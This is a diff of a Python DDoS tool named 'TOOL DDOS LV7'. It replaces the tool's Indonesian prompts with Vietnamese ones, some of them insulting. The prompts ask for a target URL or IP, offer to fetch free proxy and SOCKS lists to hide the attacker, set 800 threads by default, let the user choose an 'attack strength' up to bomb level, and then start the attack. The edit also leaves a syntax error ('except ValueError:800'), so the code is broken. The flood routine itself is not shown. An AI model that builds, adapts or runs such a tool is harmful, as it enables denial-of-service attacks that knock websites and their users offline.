@@ -21,8 +21,8 @@ print('''
       ╚════╝    ╚═╝   ╚═╝    ╚═╝     ╚══════╝ ╚═╝    ╚═╝ ╚═╝  
            ════╦═══════════════════════════╦════
             ╔══╩═══════════════════════════╩══╗
-            ║             TOOL DDOS LV7             ║
-            ║        TOOL BY NÔNG MINH QUÂN         ║
+            ║             TOOL DDOS LV7         ║
+            ║        TOOL BY NÔNG MINH QUÂN     ║
             ╚═════════════════════════════════╝                      
                    Recode By NÔNG MINH QUÂN                      
 	''') # la grafica ci sta
@@ -468,19 +468,19 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 	global choice1
 	global ips
 
-	choice1 = input("\n Target? [0] atau[1] > ")
+	choice1 = input("\n mục tiêu [0] ko có mục tiêu [1] > ")
 
 	if choice1 == "1":
-		ip_file = input("Masukkan file txt dari ips > ")
-		ips = open(ip_file).readlines()
+		setup_file = input("ghi cái file 'setup.txt' vào")
+		setup = open(setup_file).readlines()
 
 
 
 	else:
-		url = input("\nMasukan URL/IP: ").strip()
+		url = input("\ attack URL/IP: ").strip()
 
 		if url == "":
-			print ("Silakan masukkan urlnya.")
+			print ("vui lòng nhập http")
 			starturl()
 
 		try:
@@ -491,7 +491,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 			else:
 				url = "http://" + url
 		except:
-			print("salah ketik, coba lagi.")
+			print("mày ngu thế hả")
 			starturl()
 
 		try:
@@ -509,7 +509,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 def proxymode():
 	global choice2
-	choice2 = input("Ingin menggunakan proxy/socks mode? ketik 'y' untuk aktifkan: ")
+	choice2 = input("mày muốn sử dụng proxy/socks không nếu có bấn 'y'")
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -517,17 +517,17 @@ def proxymode():
 
 def choiceproxysocks():
 	global choice3
-	choice3 = input("Ketik '0' untuk aktifkan proxymode atau Ketik '1' Untuk mengaktifkan socksmode: ")
+	choice3 = input("'0' là chạy tool bằng proxy / '1' là chạy bằng socks: ")
 	if choice3 == "0":
 		choicedownproxy()
 	elif choice3 == "1":
 		choicedownsocks()
 	else:
-		print ("Anda salah ketik, coba lagi.")
+		print ("nhập cho cẩn thận vào ")
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Apakah Anda ingin mengunduh list baru / proxy? ketik 'y' untuk iya: ")
+	choice4 = input("muốn tải  proxy mới không nếu có bấm'y' ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
@@ -535,7 +535,7 @@ def choicedownproxy():
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Apakah Anda ingin mengunduh list baru / proxy? ketik 'y' untuk iya': ")
+	choice4 = input("muốn tải  socks mới không nếu có bấm'y'")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
@@ -562,14 +562,14 @@ def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 		out_file.write("")
 		out_file.write(proxies)
 		out_file.close()
-		print ("Proxies Berhasil di donlot.")
+		print ("tải proxy xong rồi ")
 	except: # se succede qualche casino
 		print ("\nERROR!\n")
 	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()
 
 def proxylist():
 	global proxies
-	out_file = str(input("Masukkan nama file/jalur proxylist (proxy.txt): "))
+	out_file = str(input("ghi cái này vào (proxy.txt): "))
 	if out_file == "":
 		out_file = "proxy.txt"
 	proxies = open(out_file).readlines()
@@ -578,8 +578,8 @@ def proxylist():
 def numthreads():
 	global threads
 	try:
-		threads = int(input("Therds nya mau brp? (800): "))
-	except ValueError:
+		threads = int(input("chủ đề mày ko có quyền lựa chọn (800): "))
+	except ValueError:800
 		threads = 800
 		print ("800 threads selected.\n")
 	multiplication()
@@ -587,14 +587,14 @@ def numthreads():
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Kekuatan Serangan [(1-5=normal)(50=kuat)(100 atau lebih=bom)]: "))
+		multiple = int(input("chọn sức tấn công đê [(1-5=bình thường)(50=mạnh)(100 tự hiểu)]: "))
 	except ValueError:
-		print("Anda salah ketik, coba lagi.\n")
+		print("nhập cẩn thận vào \n")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
+	choice6 = input("'Enter' tool mới chạy: ")
 	if choice6 == "":
 		loop()
 	elif choice6 == "Enter": #lool
